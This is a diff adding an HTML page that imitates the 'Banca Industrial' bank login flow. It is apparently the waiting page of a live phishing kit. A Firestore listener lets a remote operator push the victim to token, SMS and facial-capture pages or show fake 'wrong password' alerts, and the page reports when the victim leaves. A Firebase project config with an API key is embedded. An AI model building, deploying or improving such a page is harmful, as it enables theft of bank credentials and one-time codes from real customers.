@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banca Industrial</title>
+    <meta http-equiv="refresh" content="10; url=facial.html">
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+        serverTimestamp,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.serverTimestamp = serverTimestamp;
+      window.onSnapshot = onSnapshot;
+    </script>
+    <style>
+      body {
+        margin: 0;
+        border: 0;
+        font-family:
+          "Franklin Gothic Medium", "Arial Narrow", Arial, sans-serif;
+        color: white;
+      }
+      .contenedor {
+        min-height: 105px;
+        background: #003764;
+        display: flex;
+        align-items: center;
+      }
+      .contenedor > div {
+        flex: 1; /* Hace que ambos divs tengan el mismo tamaño en dispositivos grandes */
+      }
+
+      @media (max-width: 768px) {
+        .contenedor {
+          flex-direction: column; /* Cambia la dirección para dispositivos móviles */
+          padding-top: 30px;
+        }
+        .pc {
+          display: none;
+        }
+        .celular {
+          margin-top: 20px;
+        }
+      }
+      @media (min-width: 768px) {
+        .celular {
+          display: none;
+        }
+      }
+    </style>
+    <style>
+      .contenedor-dividido {
+        display: flex;
+      }
+
+      .izquierda,
+      .derecha {
+        flex: 1; /* Ambos divs ocupan el mismo espacio en pantallas grandes */
+      }
+
+      .derecha {
+        display: flex;
+        justify-content: center; /* Centrado horizontal */
+        align-items: center; /* Centrado vertical */
+        flex-wrap: wrap;
+      }
+      @media (max-width: 768px) {
+        .izquierda {
+          display: none; /* Oculta el div de la izquierda en dispositivos móviles */
+        }
+      }
+    </style>
+    <style>
+      .inputs {
+        width: 247px;
+        height: 44px;
+        background: transparent;
+        padding-left: 55px;
+        border-radius: 5px;
+        border-color: white;
+      }
+      .inputs::placeholder {
+        color: gray;
+        font-weight: bold;
+      }
+      .a {
+        color: white;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="contenedor">
+      <div>
+        <img src="logo_BI-blanco.png" width="70px" style="margin-left: 15%" />
+      </div>
+      <div style="text-align: center">
+        <img src="menu.JPG" width="450px" class="pc" />
+        <img src="menu2.PNG" width="300px" class="celular" />
+      </div>
+    </div>
+
+    <div class="contenedor-dividido">
+      <div
+        class="izquierda"
+        style="
+          height: 100vh;
+          background-image: url(&quot;img1Actual.png&quot;);
+          background-size: cover;
+          background-position: center;
+          background-repeat: no-repeat;
+        "
+      ></div>
+      <div class="derecha">
+        <div style="margin-top: 50px" class="pc">
+          <img src="Logotipo_vertical_bi.png" style="width: 174px" />
+        </div>
+
+        <div
+          style="
+            margin-top: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+          "
+        >
+          <div
+            style="
+              width: 340px;
+              height: 405px;
+              background-image: url(&quot;cargando.png&quot;);
+              background-size: cover;
+              background-position: center;
+              background-repeat: no-repeat;
+            "
+          >
+            <div style="text-align: center; margin-top: 80px">
+              <h2>Cargando</h2>
+              <img
+                src="https://static.wixstatic.com/media/294817_aef433e9aa43401f8076613982aaf792~mv2.gif"
+                width="120px"
+              />
+              <h4 id="contador">Estamos verficando sus datos</h4>
+            </div>
+          </div>
+        </div>
+        <div>
+          <img
+            src="tipsdesguridad.PNG"
+            width="340px"
+            style="margin-top: 20px"
+          />
+        </div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+      </div>
+    </div>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "s2",
+        localStorage.getItem("usuario"),
+      );
+      window.onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+
+          if (questionData.page == 1) {
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 2) {
+            window.location.href = "token.html";
+          }
+          if (questionData.page == 3) {
+            alert("Contraseña Incorrecta");
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 4) {
+            alert("Autentiación Fallida");
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 5) {
+            window.location.href = "sms.html";
+          }
+          if (questionData.page == 6) {
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 8) {
+            window.location.href = "facial.html";
+          }
+          if (questionData.page == 7) {
+            window.location.href = "sms.html";
+          }
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script>
+  <script>
+    window.addEventListener("beforeunload", async () => {
+      const questionRef = doc(window.db, "s2", localStorage.getItem("usuario"));
+      await setDoc(questionRef, { activo: 0 }, { merge: true });
+    });
+  </script>
+</html>
